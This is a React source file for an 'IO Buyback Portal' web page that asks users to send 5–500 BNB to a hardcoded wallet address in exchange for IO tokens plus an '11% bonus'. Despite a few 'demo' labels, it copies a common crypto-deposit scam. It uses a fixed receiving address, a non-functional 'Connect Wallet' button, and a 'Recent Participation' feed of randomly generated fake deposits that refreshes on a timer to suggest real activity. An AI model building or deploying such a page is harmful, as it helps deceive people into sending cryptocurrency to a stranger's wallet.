import React,{useEffect,useMemo,useState}from"react";import{createRoot}from"react-dom/client";import{ArrowRight,Check,Clock3,Copy,Moon,RefreshCw,ShieldCheck,Sparkles,Sun,Wallet,X}from"lucide-react";import"./styles.css";
const ADDRESS="0x6b60465D676d5FF50F615F2EB5F88baFA56a42b3",BONUS=.11,MIN=5,MAX=500;
const amounts=[5,10,6,8,13,12,20,7,15,25,18,9,11,22,16],offsets=[2,9,24,41,58,72,133,242,427,661,870,1500,3100,5200,7600];
const seed=()=>{const n=Date.now();return amounts.map((amount,i)=>({id:`demo-${i}-${n}`,amount,time:new Date(n-offsets[i]*6e4)}))};
const rel=(d,now=Date.now())=>{let m=Math.max(0,Math.floor((now-d.getTime())/6e4));if(m<60)return`${m} minute${m===1?"":"s"} ago`;let h=Math.floor(m/60);if(h<24)return`${h} hour${h===1?"":"s"} ago`;if(h<48)return"Yesterday";let day=Math.floor(h/24);return`${day} days ago`};
const money=v=>v==null?"—":new Intl.NumberFormat("en-US",{style:"currency",currency:"USD",maximumFractionDigits:v<1?4:2}).format(v);
const tok=v=>v?new Intl.NumberFormat("en-US",{maximumFractionDigits:4}).format(v):"—";
function App(){const[dark,setDark]=useState(true),[amount,setAmount]=useState(5),[io,setIo]=useState(null),[bnb,setBnb]=useState(null),[state,setState]=useState("loading"),[updated,setUpdated]=useState(null),[items,setItems]=useState(seed),[modal,setModal]=useState(false),[wallet,setWallet]=useState(false),[copied,setCopied]=useState(false),[now,setNow]=useState(Date.now());
async function market(){
  try{
    const response = await fetch(
      "https://api.coingecko.com/api/v3/simple/price?ids=io-net,binancecoin&vs_currencies=usd"
    );

    if(!response.ok) throw new Error("Market data request failed");

    const data = await response.json();

    setIo(data["io-net"]?.usd ?? null);
    setBnb(data["binancecoin"]?.usd ?? null);
  }catch(error){
    console.error("Market data error:", error);
    setIo(null);
    setBnb(null);
  }
}
useEffect(()=>{market();let x=setInterval(market,6e4);return()=>clearInterval(x)},[]);
useEffect(()=>{let x=setInterval(()=>setNow(Date.now()),3e4);return()=>clearInterval(x)},[]);
useEffect(()=>{let x=setInterval(()=>setItems(p=>[{id:String(Date.now()),amount:amounts[Math.floor(Math.random()*amounts.length)],time:new Date()},...p].slice(0,20)),9e4);return()=>clearInterval(x)},[]);
const base=useMemo(()=>io&&bnb?(amount*bnb/io):0,[amount,bnb,io]),bonus=base*BONUS,total=base+bonus,usd=amount*(bnb||0),range=amount<MIN?"Participation starts at 5 BNB.":amount>MAX?"Maximum participation is 500 BNB.":"";
const copy=async()=>{await navigator.clipboard?.writeText(ADDRESS);setCopied(true);setTimeout(()=>setCopied(false),1500)};
return <div className={dark?"app dark":"app"}><header><div className="brand"><b>IO</b><span><strong>IO Buyback Portal</strong><small>WEB3 BUYBACK NETWORK</small></span></div><nav><a>Dashboard</a><a>Buyback</a><a>Calculator</a><a>Activity</a><a>About</a></nav><div className="actions"><button onClick={()=>setDark(!dark)}>{dark?<Sun/>:<Moon/>}</button><button className="wallet" onClick={()=>setWallet(!wallet)}><Wallet/>{wallet?"0x••••••••":"Connect Wallet"}</button></div></header>
<main><section className="hero"><div><label>✦ WEB3 ALLOCATION INTERFACE</label><h1>IO Buyback</h1><p>Calculate an estimated IO allocation using current BNB and IO market prices.</p><div><button className="primary" onClick={()=>document.getElementById("calc").scrollIntoView({behavior:"smooth"})}>Calculate Allocation <ArrowRight/></button></div></div><div className="orb">IO</div></section>
<div className="stats"><Stat t="Minimum Participation" v="5 BNB"/><Stat t="Maximum Participation" v="500 BNB"/><Stat t="Starting Bonus" v="11%"/><Stat t="Network" v="BNB Smart Chain"/></div>
<section className="section"><div className="heading"><div><label>MARKET OVERVIEW</label><h2>Live Market Data</h2></div><button className="outline" onClick={market}><RefreshCw/> Refresh</button></div><div className="cards"><Market name="IO Network"sym="IO/USD"price={money(io)} state={state}/><Market name="BNB"sym="BNB/USD"price={money(bnb)} state={state}/><div className="card market"><i>%</i><small>PROGRAM</small><h3>Buyback Program</h3><strong>5–500 BNB</strong><p>11% starting bonus</p></div></div><div className="updated"><Clock3/> {state==="live"?`Live · Updated ${updated?rel(new Date(updated)):"just now"}`:state==="loading"?"Loading market data…":"Market data temporarily unavailable"}</div></section>
<section id="calc" className="section calc"><div className="calculator card"><div className="heading"><div><label>ESTIMATE</label><h2>Buyback Calculator</h2><p>Enter a BNB amount to estimate an IO allocation.</p></div><em>+11% BONUS</em></div><label>BNB Amount</label><div className="input"><input type="number" min="0" step=".01" value={amount} onChange={e=>setAmount(Number(e.target.value))}/><b>BNB</b></div>{range&&<div className="notice">{range}</div>}<Row l="BNB USD Value"v={money(usd)}/><Row l="Current BNB Price"v={money(bnb)}/><Row l="Current IO Price"v={money(io)}/><Row l="Base IO Allocation"v={tok(base)+" IO"}/><Row l="Bonus (11%)"v={"+"+tok(bonus)+" IO"}/><Row hi l="Estimated Total IO"v={tok(total)+" IO"}/><button className="primary full" disabled={amount<MIN||amount>MAX} onClick={()=>setModal(true)}>Review Participation <ArrowRight/></button><small>Calculation is an estimate based on displayed market data.</small></div></section>
<section className="twocol section"><div className="card info"><label>ABOUT</label><h2>About the Buyback</h2><p>This portal demonstrates a Web3 allocation interface where a BNB amount can be used to estimate an IO allocation using displayed market prices and an applicable bonus.</p><p>Market prices are variable and estimates can change.</p></div><div className="card info"><label>PROCESS</label><h2>How to Participate</h2><Step n="01"t="Enter BNB Amount"/><Step n="02"t="Review Allocation"/><Step n="03"t="Review Details"/><Step n="04"t="Confirm Demo"/></div></section>
<section className="section"><div className="heading"><div><label>DEMO ACTIVITY</label><h2>Recent Participation</h2><p>Simulated participation activity for the prototype.</p></div><em>DEMO DATA</em></div><div className="activity">{items.map(x=><div className="activityItem"key={x.id}><span>●</span><div><b>{rel(x.time,now)}</b><small>{x.amount} BNB participated</small></div></div>)}</div></section>
<section className="section faq"><label>FAQ</label><h2>About this interface</h2><details><summary>What is the participation range?</summary><p>The displayed prototype range is 5 BNB to 500 BNB.</p></details><details><summary>How is the bonus calculated?</summary><p>The calculator applies an 11% bonus to the estimated base allocation.</p></details><details><summary>Are the activity entries real blockchain transactions?</summary><p>No. The activity feed is simulated demo data.</p></details></section></main>
<footer><b>IO Buyback Portal</b><span>Web3 allocation interface prototype · © 2026</span></footer>
{modal&&<div className="overlay"onClick={()=>setModal(false)}><div className="modal"onClick={e=>e.stopPropagation()}><button className="close"onClick={()=>setModal(false)}><X/></button><label>PARTICIPATION</label><h2>Review Participation</h2><Row l="BNB Amount"v={amount+" BNB"}/><Row l="BNB Price"v={money(bnb)}/><Row l="IO Price"v={money(io)}/><Row l="Base Allocation"v={tok(base)+" IO"}/><Row l="Bonus"v={tok(bonus)+" IO (11%)"}/><Row hi l="Estimated Total"v={tok(total)+" IO"}/><label>Receiving Address</label><div className="address">{ADDRESS}<button onClick={copy}>{copied?<Check/>:<Copy/>}</button></div><p className="note">Review the receiving address and transaction details carefully. This prototype does not automatically transfer BNB.</p><button className="primary full"onClick={()=>{setItems(p=>[{id:String(Date.now()),amount,time:new Date()},...p].slice(0,20));setModal(false)}}>Confirm Demo Participation</button></div></div>}</div>}
function Stat({t,v}){return <div className="stat card"><small>{t}</small><strong>{v}</strong></div>}
function Market({name,sym,price,state}){return <div className="card market"><i>{name==="BNB"?"B":"IO"}</i><small>{state==="live"?"LIVE":"MARKET"}</small><h3>{name}</h3><strong>{price}</strong><p>{sym}</p></div>}
function Row({l,v,hi}){return <div className={hi?"row hi":"row"}><span>{l}</span><b>{v}</b></div>}
function Step({n,t}){return <div className="step"><b>{n}</b><span><strong>{t}</strong><small>Review the information carefully before proceeding.</small></span></div>}
createRoot(document.getElementById("root")).render(<App/>);
